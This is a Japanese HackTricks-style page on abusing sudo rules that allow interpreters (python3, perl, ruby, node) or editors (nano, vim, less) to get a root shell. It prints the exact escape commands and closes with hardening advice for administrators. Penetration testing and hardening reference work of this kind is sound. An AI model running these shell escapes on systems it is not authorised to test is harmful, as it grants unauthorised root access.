# Sudo Command Abuse

{{#include ../../banners/hacktricks-training.md}}

## Sudoで許可されたinterpreter

`sudo -l` によってユーザーがrootとしてinterpreterを実行できる場合、直接的なcode executionとして扱います。interpreterは任意のcodeを実行するように設計されているため、`python3`、`perl`、`ruby`、`lua`、`node`、または類似のbinaryの実行を許可するruleは、引数が厳密に制限・検証されていない限り、通常はroot command executionと同等です。

一般的なreview flow:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
その他のインタープリタの例:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
正確なパスが重要です。sudo ルールで `/usr/bin/python3` が許可されている場合は、検証時にその正確なパスを使用します：
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudoで許可されたエディタ

`sudo -l` によってユーザーが root として対話型エディタを実行できる場合、それを安全なファイル編集権限ではなく、コマンド実行の入口として扱ってください。エディタは、多くの場合、shell commands の実行、任意のファイルの読み取り、任意のファイルへの書き込み、またはエディタ内からの外部ヘルパーの呼び出しが可能です。

一般的なレビューの流れ:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano command execution

`nano` が sudo 経由で許可されている場合、editor interface から command execution に到達できる可能性があります:
```text
Ctrl+R
Ctrl+X
```
その後、次のようなコマンドを提示します:
```bash
id
/bin/sh
```
一部のターミナルでは、インタラクティブシェルで標準ストリームをリダイレクトする必要があります：
```bash
reset; /bin/sh 1>&0 2>&0
```
キー操作の正確な順序は、nano のバージョンやビルドオプションによって異なる場合がありますが、security issue は同じです。editor は root として実行されており、外部コマンドを呼び出せます。

### その他の一般的な editor escape

Vim-style editor では、一般的に `:!` による command execution が可能です。
```text
:!/bin/sh
```
`less` などの Pager では、shell execution も可能です:
```text
!/bin/sh
```
## 防御に関する注意事項

- sudo を介して interpreters や interactive editors を許可することは避ける。
- 1 つの限定された管理操作のみを実行する、固定された root-owned wrappers を優先する。
- interpreter が避けられない場合は、正確な script path に制限し、ユーザーが制御する arguments、書き込み可能な imports、`PYTHONPATH`、安全でない environment の保持を防止する。
- file editing が必要な場合は、正確な file path に制限し、patched sudo versions と厳格な environment handling を備えた `sudoedit` の使用を検討する。
- `SETENV`、`env_keep`、書き込み可能な working directories、書き込み可能な module/import paths、`NOEXEC`、`use_pty`、logging を確認する。ただし、これらを完全な sandbox とみなしてはならない。
{{#include ../../banners/hacktricks-training.md}}
